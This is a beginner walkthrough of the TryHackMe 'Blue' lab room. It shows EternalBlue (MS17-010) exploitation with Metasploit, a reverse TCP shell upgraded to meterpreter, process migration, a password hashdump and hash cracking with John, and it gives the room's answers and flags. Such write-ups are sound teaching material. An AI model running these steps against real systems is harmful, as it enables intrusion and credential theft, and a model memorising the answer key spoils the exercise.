@@ -1,0 +1,147 @@
+TryHackMe — Blue WriteUp/Walkthrough with Answers
+
+
+Beginner-friendly Writeup/Walkthrough of the room Blue from TryHackMe with answers. 
+
+The Contents of the Room:
+Task 1: Recon
+Task 2: Gain Access
+Task 3: Escalate
+Task 4: Cracking
+Task 5: Find flags!
+Task 1: Recon
+Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
+We run the following nmap scan:
+
+nmap -sS -Pn -A -p- -T5 $ip
+Answer: No answer needed
+
+How many ports are open with a port number under 1000?
+We get 3 ports opened under the port 1000.
+
+Answer: 3
+
+What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)
+To find this we will use a nmap script to find if the machine is vulnerable:
+
+nmap -Ss -Pn -p 445 $ip --script smb-vuln-ms17-010.nse
+And we find that it is vulnerable to ms17–010:
+
+Answer: ms17–010
+
+Task 2: Gain Access
+Start Metasploit
+We run the command msfconsole to start metasploit.
+
+Answer: No answer needed
+
+Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)
+We can now search for ms17–010:
+
+search ms17-010
+
+And.. we find it, its the first one.
+
+Answer: exploit/windows/smb/ms17_010_eternalblue
+
+Show options and set the one required value. What is the name of this value? (All caps for submission)
+We use the command options to show all the options:
+
+
+We can see the one required field we need to fill is RHOSTS.
+
+Answer: RHOSTS
+
+We now se the RHOSTS to the machine ip:
+
+
+Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
+We set the payload specified:
+
+set payload windows/x64/shell/reverse_tcp
+Answer: No answer needed
+
+With that done, run the exploit!
+Now we can run the exploit, with the command:
+
+run
+Answer: No answer needed
+
+Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
+And eventually after a bit of waiting we finally get a shell.
+
+Answer: No answer needed
+
+Task 3: Escalate
+If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
+We now send our session to the background and convert our shell to meterpreter to do this we first search for shell_to_meterpreter:
+
+search shell_to_meterpreter
+
+Answer: post/multi/manage/shell_to_meterpreter
+
+Select this (use MODULE_PATH). Show options, what option are we required to change?
+
+We can see the we need to set the SESSION:
+
+Answer: SESSION
+
+Set the required option, you may need to list all of the sessions to find your target here.
+
+I also set the LHOST to our machine’s ip:
+
+
+Answer: No answer needed
+
+Run! If this doesn’t work, try completing the exploit from the previous task once more.
+run
+Answer: No answer needed
+
+Once the meterpreter shell conversion completes, select that session for use.
+We now change to our session to our first session:
+
+sessions -i 1
+Answer: No answer needed
+
+Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command ‘shell’ and run ‘whoami’. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
+Answer: No answer needed
+
+List all of the processes running via the ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
+Answer: No answer needed
+
+Migrate to this process using the ‘migrate PROCESS_ID’ command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
+migrate 2596
+Answer: No answer needed
+
+Task 4: Cracking
+Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
+hashdump
+
+Answer: Jon
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+We copy the hash of jon to a file hash.txt and use john to crack it:
+
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Answer: alqfna22
+
+Task 5: Find flags!
+Flag1? This flag can be found at the system root.
+
+Answer: flag{access_the_machine}
+
+Flag2? his flag can be found at the location where passwords are stored within Windows.
+search -f flag2.txt
+
+
+Answer: flag{sam_database_elevated_access}
+
+flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
+
+Answer: flag{admin_documents_can_be_valuable}
+
+And… that’s it! Thanks for reading my writeup!
+
+Tryhackme
+Tryhackme Walkthrough
